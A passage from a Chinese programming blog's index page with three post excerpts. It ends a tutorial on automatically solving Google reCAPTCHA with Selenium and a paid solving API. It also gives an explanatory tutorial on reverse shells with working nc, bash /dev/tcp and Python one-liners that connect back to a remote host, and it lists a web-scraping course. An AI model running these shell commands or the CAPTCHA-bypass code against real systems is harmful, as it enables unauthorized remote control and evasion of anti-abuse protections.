                          <pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify_single_captcha</span><span class="params">(self, index)</span>:</span></span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    elements = self.wait.until(EC.visibility_of_all_elements_located(</span><br><span class="line">        (By.CSS_SELECTOR, <span class="string">'#rc-imageselect-target table td'</span>)))</span><br><span class="line">    single_captcha_element: WebElement = elements[index]</span><br><span class="line">    class_name = single_captcha_element.get_attribute(<span class="string">'class'</span>)</span><br><span class="line">    logger.debug(<span class="string">f'verifiying single captcha <span class="subst">&#123;index&#125;</span>, class <span class="subst">&#123;class_name&#125;</span>'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'selected'</span> <span class="keyword">in</span> class_name:</span><br><span class="line">        logger.debug(<span class="string">f'no new single captcha displayed'</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    logger.debug(<span class="string">'new single captcha displayed'</span>)</span><br><span class="line">    single_captcha_url = single_captcha_element.find_element_by_css_selector(</span><br><span class="line">            <span class="string">'img'</span>).get_attribute(<span class="string">'src'</span>)</span><br><span class="line">    logger.debug(<span class="string">f'single_captcha_url <span class="subst">&#123;single_captcha_url&#125;</span>'</span>)</span><br><span class="line">    <span class="keyword">with</span> open(CAPTCHA_SINGLE_IMAGE_FILE_PATH, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(requests.get(single_captcha_url).content)</span><br><span class="line">    resized_single_captcha_base64_string = resize_base64_image(</span><br><span class="line">        CAPTCHA_SINGLE_IMAGE_FILE_PATH, (<span class="number">100</span>, <span class="number">100</span>))</span><br><span class="line">    single_captcha_recognize_result = self.captcha_resolver.create_task(</span><br><span class="line">        resized_single_captcha_base64_string, get_question_id_by_target_name(self.captcha_target_name))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> single_captcha_recognize_result:</span><br><span class="line">        logger.error(<span class="string">'count not get single captcha recognize result'</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    has_object = single_captcha_recognize_result.get(</span><br><span class="line">        <span class="string">'solution'</span>, &#123;&#125;).get(<span class="string">'hasObject'</span>)</span><br><span class="line">    <span class="keyword">if</span> has_object <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        logger.error(<span class="string">'count not get captcha recognized indices'</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> has_object <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">        logger.debug(<span class="string">'no more object in this single captcha'</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> has_object:</span><br><span class="line">        single_captcha_element.click()</span><br><span class="line">        <span class="comment"># check for new single captcha</span></span><br><span class="line">        self.verify_single_captcha(index)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>OK，这里我们定义了一个 verify_single_captcha 方法，然后传入了格子对应的序号。接着我们首先尝试查找格子对应的节点，然后找出对应的 HTML 的 class 属性。如果没有出现新的小图，那就是这样的选中状态，对应的 class 就包含了 selected 字样，如图所示：</p>
                  <p><img src="https://cdn.cuiqingcai.com/aec6b.png" alt=""></p>
                  <p>对于这样的图片，我们就不需要进行二次验证，否则就需要对这个格子进行截图和二次识别。</p>
                  <p>二次识别的步骤也是一样的，我们需要将小格子对应的图片单独获取其 url，然后下载下来，接着调整大小并转化成 Base64 编码，然后发给 API，API 会通过一个 hasObject 字段告诉我们这个小图里面是否包含我们想要识别的目标内容，如果是，那就接着点击，然后递归进行下一次检查，如果不是，那就跳过。</p>
                  <h3 id="点击验证"><a href="#点击验证" class="headerlink" title="点击验证"></a>点击验证</h3>
                  <p>好，那么有了上面的逻辑，我们就能完成整个 ReCAPTCHA 的识别和点选了。</p>
                  <p>最后，我们模拟点击验证按钮就好了：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_verify_button</span><span class="params">(self)</span> -&gt; WebElement:</span></span><br><span class="line">    verify_button = self.wait.until(EC.presence_of_element_located(</span><br><span class="line">        (By.CSS_SELECTOR, <span class="string">'#recaptcha-verify-button'</span>)))</span><br><span class="line">    <span class="keyword">return</span> verify_button</span><br><span class="line"></span><br><span class="line"><span class="comment"># after all captcha clicked</span></span><br><span class="line">verify_button: WebElement = self.get_verify_button()</span><br><span class="line"><span class="keyword">if</span> verify_button.is_displayed:</span><br><span class="line">    verify_button.click()</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <h3 id="校验结果"><a href="#校验结果" class="headerlink" title="校验结果"></a>校验结果</h3>
                  <p>点击完了之后，我们可以尝试检查网页变化，看看有没有验证成功。</p>
                  <p>比如验证成功的标志就是出现一个绿色小对勾：</p>
                  <p><img src="https://cdn.cuiqingcai.com/y8jvw.png" alt=""></p>
                  <p>检查方法如下：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_is_successful</span><span class="params">(self)</span>:</span></span><br><span class="line">    self.switch_to_captcha_entry_iframe()</span><br><span class="line">    anchor: WebElement = self.wait.until(EC.visibility_of_element_located((</span><br><span class="line">        By.ID, <span class="string">'recaptcha-anchor'</span></span><br><span class="line">    )))</span><br><span class="line">    checked = anchor.get_attribute(<span class="string">'aria-checked'</span>)</span><br><span class="line">    logger.debug(<span class="string">f'checked <span class="subst">&#123;checked&#125;</span>'</span>)</span><br><span class="line">    <span class="keyword">return</span> str(checked) == <span class="string">'true'</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里我们先切换了 iframe，然后检查了对应的 class 是否是符合期望的。</p>
                  <p>最后如果 get_is_successful 返回结果是 True，那就代表识别成功了，那就整个完成了。</p>
                  <p>如果返回结果是 False，我们可以进一步递归调用上述逻辑进行二次识别，直到识别成功即可。</p>
                  <h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2>
                  <p>以上代码可能比较复杂，这里我将代码进行了规整，然后放到 GitHub 上了，大家如有需要可以自取：<a href="https://github.com/Python3WebSpider/RecaptchaResolver" target="_blank" rel="noopener" title="https://github.com/Python3WebSpider/RecaptchaResolver">https://github.com/Python3WebSpider/RecaptchaResolver</a></p>
                  <h2 id="注册地址"><a href="#注册地址" class="headerlink" title="注册地址"></a>注册地址</h2>
                  <p>最后需要说明一点，上面的验证码服务是收费的，每验证一次可能花一定的点数，比如识别一次 3x3 的图要花 10 点数，而充值一块钱就能获得 1000 点数，所以识别一次就一分钱，还是比较便宜的。</p>
                  <p>我这里充值了好几万点数，然后我就变成了 VIP5 级的账号。我研究了下发现大家如果用我的邀请链接 <a href="https://yescaptcha.com/i/CnZPBu" target="_blank" rel="noopener" title="https://yescaptcha.com/i/CnZPBu">https://yescaptcha.com/i/CnZPBu</a> 注册大家可以直接变成 VIP4，然后 VIP4 可以获取首充赠送 10% 的优惠，还不错哈～</p>
                  <p>希望本文对大家有帮助。</p>
                  <p>非常感谢你的阅读，更多精彩内容，请关注我的公众号「进击的 Coder」和「崔庆才丨静觅」。</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2022-05-26 18:00:22" itemprop="dateCreated datePublished" datetime="2022-05-26T18:00:22+08:00">2022-05-26</time>
                </span>
                <span id="/36057.html" class="post-meta-item leancloud_visitors" data-flag-title="谷歌验证码 ReCAPTCHA 的模拟点击破解方案来了！" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>13k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>12 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/36056.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> 技术杂谈 <i class="label-arrow"></i>
                  </a>
                  <a href="/36056.html" class="post-title-link" itemprop="url">什么是反弹 Shell？</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p>前段时间被一位产品经理嘲笑了，说我居然连反弹 Shell 都不知道！</p>
                  <p>说实话当时我还真不知道，但这口气咽不下去啊，得赶紧学来看看，这不，我已经学会了！</p>
                  <p>学完之后我特地来记录下，同时分享给大家，以后产品经理再也不敢嘲笑我们不懂反弹 Shell 了！</p>
                  <h2 id="什么是反弹-Shell"><a href="#什么是反弹-Shell" class="headerlink" title="什么是反弹 Shell"></a>什么是反弹 Shell</h2>
                  <p>我们都知道 Shell 的概念吧，简单来说，Shell 就是实现用户命令的接口，通过这个接口我们就能实现对计算机的控制，比如我们常见的 ssh 就是执行的 Shell 命令实现对远程对服务器的控制。</p>
                  <p>那反弹 Shell 是啥呢？其英文名叫做 Reverse Shell，具体干什么的呢？就是控制端首先监听某个 TCP/UDP 端口，然后被控制端向这个端口发起一个请求，同时将自己命令行的输入输出转移到控制端，从而控制端就可以输入命令来控制被控端了。</p>
                  <p>比如说，我们有两台主机 A、B，我们最终想实现在 A 上控制 B。那么如果用正向 Shell，其实就是在 A 上输入 B 的连接地址，比如通过 ssh 连接到 B，连接成功之后，我们就可以在 A 上通过命令控制 B 了。如果用反向 Shell，那就是在 A 上先开启一个监听端口，然后让 B 去连接 A 的这个端口，连接成功之后，A 这边就能通过命令控制 B 了。</p>
                  <h2 id="反弹-Shell-有什么用？"><a href="#反弹-Shell-有什么用？" class="headerlink" title="反弹 Shell 有什么用？"></a>反弹 Shell 有什么用？</h2>
                  <p>还是原来的例子，我们想用 A 来控制 B，如果想用 ssh 等命令来控制，那得输入 B 的 sshd 地址或者端口对吧？但是在很多情况下，由于防火墙、安全组、局域网、NAT 等原因，我们实际上是无法直接连接到 B 的，比如：</p>
                  <ul>
                    <li>
                      <p>A 虽然有公网 IP，但 B 是一个处于内网的机器，A 就没法直接连到 B 上。</p>
                    </li>
                    <li>
                      <p>B 上开了防火墙或者安全组限制，sshd 的服务端口 22 被封闭了。</p>
                    </li>
                    <li>
                      <p>B 是一台拨号主机，其 IP 地址经常变动。</p>
                    </li>
                    <li>
                      <p>假如 B 被攻击了，我们想让 B 向 A 汇报自己的状况，那自然就需要 B 主动去连接 A。</p>
                    </li>
                  </ul>
                  <p>如果是这些情况，我们就可以用反弹 Shell 用 A 来控制 B 了。</p>
                  <h2 id="反弹-Shell-案例"><a href="#反弹-Shell-案例" class="headerlink" title="反弹 Shell 案例"></a>反弹 Shell 案例</h2>
                  <p>首先我们先看一个标准的反弹 Shell 的例子，这里我们一共需要两台主机：</p>
                  <ul>
                    <li>
                      <p>A 是控制端，可以处于公网之中，也可以和 B 处于一个局域网中，总之能让 B 找到 A 就行。</p>
                    </li>
                    <li>
                      <p>&#x20;B 是被控端，可以处在局域网之中。</p>
                    </li>
                  </ul>
                  <p>在开始之前我们需要用到 nc 命令，安装非常简单。</p>
                  <p>如果是 CentOS 系列系统，安装命令如下：</p>
                  <figure class="highlight powershell">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">yum install <span class="literal">-y</span> nc <span class="comment"># CentOS</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>如果是 Ubuntu 系列系统，安装命令可以参考 <a href="https://stackoverflow.com/questions/10065993/how-to-switch-to-netcat-traditional-in-ubuntu" target="_blank" rel="noopener" title="https://stackoverflow.com/questions/10065993/how-to-switch-to-netcat-traditional-in-ubuntu">https://stackoverflow.com/questions/10065993/how-to-switch-to-netcat-traditional-in-ubuntu</a>。</p>
                  <p>接着，我们在 A 上执行如下命令：</p>
                  <figure class="highlight powershell">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">nc <span class="literal">-lvp</span> <span class="number">32767</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这个命令的意思是开启 32767 的端口监听，运行之后如图所示：</p>
                  <p><img src="https://cdn.cuiqingcai.com/pa0wf.png" alt=""></p>
                  <p>这样就表明 A 上正在监听 32767 端口的连接了。</p>
                  <p>这时候，我们可以在 B 上通过类似的命令连接到 A，假如 A 的 IP 是 111.112.113.114，那么命令如下：</p>
                  <figure class="highlight powershell">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">nc <span class="number">111.112</span>.<span class="number">113.114</span> <span class="number">32767</span> <span class="literal">-e</span> /bin/bash</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <blockquote>
                    <p>注意：你在运行的时候需要替换成 A 的真实 IP 和端口。</p>
                  </blockquote>
                  <p>运行完毕之后，我们反过来观察下 A，就显示了来自某个 IP 和端口的连接，我们就可以输入命令来控制 B 了，比如这里我们输入了：</p>
                  <figure class="highlight powershell">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">uname <span class="literal">-a</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>然后就可以得到 B 的主机名了。</p>
                  <p>如图所示：</p>
                  <p><img src="https://cdn.cuiqingcai.com/l155o.png" alt=""></p>
                  <p>这样我们就通过 nc 包实现了反弹 Shell。</p>
                  <p>有人说，这 B 上一定需要安装 nc 这个包吗？其实不一定的，我们可以直接使用 bash 来实现反弹 Shell，命令如下：</p>
                  <figure class="highlight powershell">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">bash <span class="literal">-i</span> &gt;&amp; /dev/tcp/<span class="number">111.112</span>.<span class="number">113.114</span>/<span class="number">32767</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这个命令大致解释下：</p>
                  <ul>
                    <li>
                      <p><code>bash -i</code> 就是产生一个 bash 交互环境</p>
                    </li>
                    <li>
                      <p><code>&gt;&amp;</code> 可以将 bash 交互环境的输入、输出、错误输出都输出到一个地方</p>
                    </li>
                    <li>
                      <p><code>/dev/tcp/111.112.113.114/32767</code> 其实指的就是目标主机的一个连接地址，因为 Linux 环境中所有内容的定义都是以文件的形式存在的，指定这个地址就是让主机和目标主机建立一个 TCP 连接。</p>
                    </li>
                    <li>
                      <p><code>0&gt;&amp;1</code>可以将标准输入和标准输出相结合，重定向给前面标准输出的内容。</p>
                    </li>
                  </ul>
                  <p>通过这样的命令，我们就可以就是将 B 的标准输出和错误输出都重定向给 A，并且将 A 的输入都重定向给 B，这样我们就可以实现 A 对 B 的远程控制了，如图所示：</p>
                  <p><img src="https://cdn.cuiqingcai.com/bjm7a.png" alt=""></p>
                  <p>比如这样我们就可以轻松在 A 主机上拿到 B 主机的主机名、当前所处路径等内容了。</p>
                  <p>另外除了用 bash，我们还可以利用 Python 进行反弹 Shell，脚本如下：</p>
                  <figure class="highlight powershell">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">python <span class="literal">-c</span> <span class="string">'import socket,subprocess,os; \</span></span><br><span class="line"><span class="string">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span></span><br><span class="line"><span class="string">s.connect(("111.112.113.114",32767));</span></span><br><span class="line"><span class="string">os.dup2(s.fileno(),0);</span></span><br><span class="line"><span class="string">os.dup2(s.fileno(),1);</span></span><br><span class="line"><span class="string">os.dup2(s.fileno(),2);</span></span><br><span class="line"><span class="string">p=subprocess.call(["/bin/sh","-i"]);'</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以达到同样反弹 Shell 的效果，即可以用 A 来控制 B。</p>
                  <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2>
                  <p>以上就是反弹 Shell 的介绍，灵活运用反弹 Shell 可以大大便利某些场景下的远程控制，希望对大家有帮助。</p>
                  <p>更多精彩内容，请关注我的公众号「进击的 Coder」和「崔庆才丨静觅」。</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2022-04-17 10:00:22" itemprop="dateCreated datePublished" datetime="2022-04-17T10:00:22+08:00">2022-04-17</time>
                </span>
                <span id="/36056.html" class="post-meta-item leancloud_visitors" data-flag-title="什么是反弹 Shell？" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>2.2k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>2 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/17777.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> Python <i class="label-arrow"></i>
                  </a>
                  <a href="/17777.html" class="post-title-link" itemprop="url">【2022 年】崔庆才 Python3 网络爬虫学习教程</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p>大家好，我是崔庆才，非常高兴能在此处与您相见，无论您对爬虫有所涉猎还是初学爬虫，我希望我撰写的本 Python 爬虫系列教程能对您有所帮助。</p>
                  <p>要学爬虫，首推的就是 Python 语言，简单快速易上手，且 Python 语言的爬虫生态极其丰富。</p>
                  <p>我个人于 2015 年研究 Python 爬虫技术，并于 2018 年出版了个人第一版爬虫书<a href="https://item.jd.com/12333540.html" target="_blank" rel="noopener">《Python3 网络爬虫开发实战》</a>，出版至今，此本书一直处于市面上所有爬虫书的销冠位置，销量 10w 册，<a href="https://book.douban.com/subject/30175598/" target="_blank" rel="noopener">豆瓣评分</a> 9.0。</p>
                  <p>Python 爬虫技术的基本内容包括网页基础分析、requests 请求、XPath 和正则解析、Ajax 分析、Selenium 模拟浏览器爬取、Scrapy 等知识点，但技术不是一成不变的，随着近几年时代的发展，一些新兴爬虫技术如异步爬虫、JavaScript 逆向、AST 技术、安卓逆向、Hook、智能解析、WebAssembly、大规模分布式、Docker、Kubernetes 等技术不断涌现，而现在网上的爬虫文章也存在着极大问题，一个是内容泛滥不堪、同质化严重，另一个是几乎没有几篇博文能紧跟前沿技术，多数还停留在几年前的水平，而且很多爬虫教程所用案例已经非常老旧而且多数也无法运行，这极大地打击了初学者的自信心。</p>
                  <p>因此，2022 年了，有一套内容全面的、紧跟前沿技术的、案例稳定运行的爬虫教程可谓是非常难得。</p>
                  <p>是的，所以在 2021 年底，我又出版了<a href="https://item.jd.com/13527222.html" target="_blank" rel="noopener">《Python3 网络爬虫开发实战（第二版）》</a>，对旧的爬虫技术内容进行了全面更新，搭建了全新的案例平台进行全面讲解，</p>
                  <p><strong>目前截止 2022 年，可以将爬虫基本技术进行系统讲解，同时将最新前沿爬虫技术如异步、JavaScript 逆向、AST、安卓逆向、Hook、智能解析、群控技术、WebAssembly、大规模分布式、Docker、Kubernetes 等，市面上目前就这一套教程了，当然书的话也仅有<a href="https://item.jd.com/13527222.html" target="_blank" rel="noopener">《Python3 网络爬虫开发实战（第二版）》</a>可以做到。</strong></p>
                  <p>本教程内容多数来自于<a href="https://item.jd.com/13527222.html" target="_blank" rel="noopener">《Python3 网络爬虫开发实战（第二版）》</a>，本教程对书中内容进行了精简和梳理，尽量覆盖到最新的知识点，当然更全面的内容可以购买<a href="https://item.jd.com/13527222.html" target="_blank" rel="noopener">《Python3 网络爬虫开发实战（第二版）》</a>一书了解更多。</p>
                  <p>以下为 Python3 网络爬虫学习教程内容：</p>
                  <h2 id="爬虫基础入门"><a href="#爬虫基础入门" class="headerlink" title="爬虫基础入门"></a>爬虫基础入门</h2>
                  <ol>
                    <li><a href="https://cuiqingcai.com/202211.html">什么是爬虫？</a></li>
                    <li><a href="https://cuiqingcai.com/202212.html">HTTP 基本原理</a></li>
                    <li><a href="https://cuiqingcai.com/202213.html">Web 网页基础</a></li>
                    <li><a href="https://cuiqingcai.com/202214.html">Session 和 Cookie</a></li>
                    <li><a href="https://cuiqingcai.com/202221.html">urllib 爬虫初体验</a></li>
                    <li><a href="https://cuiqingcai.com/202222.html">方便好用的 requests</a></li>
                    <li><a href="https://cuiqingcai.com/202223.html">强大灵活的正则表达式</a></li>
                    <li><a href="https://cuiqingcai.com/202224.html">基础爬虫案例爬取实战</a></li>
                  </ol>
                  <h2 id="页面解析和数据存储"><a href="#页面解析和数据存储" class="headerlink" title="页面解析和数据存储"></a>页面解析和数据存储</h2>
                  <ol>
                    <li><a href="https://cuiqingcai.com/202231.html">网页解析利器 XPath 初体验</a></li>
                    <li><a href="https://cuiqingcai.com/202232.html">新兴网页解析利器 parsel </a></li>
                    <li><a href="https://cuiqingcai.com/202241.html">简易的 TXT 纯文本文件存储</a></li>
                    <li><a href="https://cuiqingcai.com/202242.html">方便灵活的 JSON 文本文件存储</a></li>
                    <li><a href="https://cuiqingcai.com/202243.html">高效实用的 MongoDB 文档存储</a></li>
                    <li><a href="https://cuiqingcai.com/202244.html">关系型数据库 MySQL 存储</a></li>
                    <li><a href="https://cuiqingcai.com/202245.html">当爬虫遇见 RabbitMQ 消息队列</a></li>
                    <li><a href="https://cuiqingcai.com/202246.html">便于高效检索的 Elasticsearch 存储</a></li>
                  </ol>
                  <h2 id="Ajax-分析和动态渲染页面爬取"><a href="#Ajax-分析和动态渲染页面爬取" class="headerlink" title="Ajax 分析和动态渲染页面爬取"></a>Ajax 分析和动态渲染页面爬取</h2>
                  <ol>
                    <li><a href="https://cuiqingcai.com/202251.html">什么是 Ajax？</a></li>
                    <li><a href="https://cuiqingcai.com/202252.html">Ajax 分析方法</a></li>
                    <li><a href="https://cuiqingcai.com/202253.html">Ajax 案例爬取实战</a></li>
                    <li><a href="https://cuiqingcai.com/202261.html">经典动态渲染工具 Selenium 的使用</a></li>
                    <li><a href="https://cuiqingcai.com/202262.html">新兴动态渲染工具 Playwright 的使用</a></li>
                  </ol>
                  <h2 id="异步爬虫和模拟登录"><a href="#异步爬虫和模拟登录" class="headerlink" title="异步爬虫和模拟登录"></a>异步爬虫和模拟登录</h2>
                  <ol>
                    <li><a href="https://cuiqingcai.com/202271.html">协程的基本原理</a></li>
                    <li><a href="https://cuiqingcai.com/202272.html">aiohttp 的基本使用</a></li>
                    <li><a href="https://cuiqingcai.com/202281.html">模拟登录的基本原理</a></li>
                    <li><a href="https://cuiqingcai.com/202282.html">Session + Cookie 模拟登录爬取实战</a></li>
                  </ol>
                  <h2 id="验证码的处理"><a href="#验证码的处理" class="headerlink" title="验证码的处理"></a>验证码的处理</h2>
                  <ol>
                    <li><a href="https://cuiqingcai.com/202291.html">OCR 识别验证码</a></li>
                    <li><a href="https://cuiqingcai.com/202292.html">OpenCV 图像匹配识别滑动验证码缺口</a></li>
                    <li><a href="https://cuiqingcai.com/202293.html">深度学习识别滑动验证码缺口</a></li>
                  </ol>
                  <h2 id="代理的使用"><a href="#代理的使用" class="headerlink" title="代理的使用"></a>代理的使用</h2>
                  <ol>
                    <li><a href="https://cuiqingcai.com/2022101.html">代理的基本原理</a></li>
                    <li><a href="https://cuiqingcai.com/2022102.html">代理的基本使用</a></li>
                    <li><a href="https://cuiqingcai.com/2022103.html">高效代理池的维护</a></li>
                    <li><a href="https://cuiqingcai.com/2022104.html">ADSL 拨号代理的使用</a></li>
                  </ol>
                  <h2 id="JavaScript-混淆、逆向技术"><a href="#JavaScript-混淆、逆向技术" class="headerlink" title="JavaScript 混淆、逆向技术"></a>JavaScript 混淆、逆向技术</h2>
                  <ol>
                    <li><a href="https://cuiqingcai.com/2022111.html">JavaScript 网站加密和混淆技术简介</a></li>
                    <li><a href="https://cuiqingcai.com/2022112.html">JavaScript 逆向调试技巧</a></li>
                    <li><a href="https://cuiqingcai.com/2022113.html">JavaScript Hook 的用法</a></li>
                    <li><a href="https://cuiqingcai.com/2022114.html">Python 模拟执行 JavaScript</a></li>
                  </ol>
                  <h2 id="App-爬虫和安卓逆向"><a href="#App-爬虫和安卓逆向" class="headerlink" title="App 爬虫和安卓逆向"></a>App 爬虫和安卓逆向</h2>
                  <h2 id="页面智能解析"><a href="#页面智能解析" class="headerlink" title="页面智能解析"></a>页面智能解析</h2>
                  <h2 id="Scrapy-框架和分布式爬虫"><a href="#Scrapy-框架和分布式爬虫" class="headerlink" title="Scrapy 框架和分布式爬虫"></a>Scrapy 框架和分布式爬虫</h2>
                  <h2 id="爬虫的部署、维护、监控"><a href="#爬虫的部署、维护、监控" class="headerlink" title="爬虫的部署、维护、监控"></a>爬虫的部署、维护、监控</h2>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2022-03-13 14:14:48" itemprop="dateCreated datePublished" datetime="2022-03-13T14:14:48+08:00">2022-03-13</time>
                </span>
                <span id="/17777.html" class="post-meta-item leancloud_visitors" data-flag-title="【2022 年】崔庆才 Python3 网络爬虫学习教程" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>1.5k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>1 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/2022114.html">
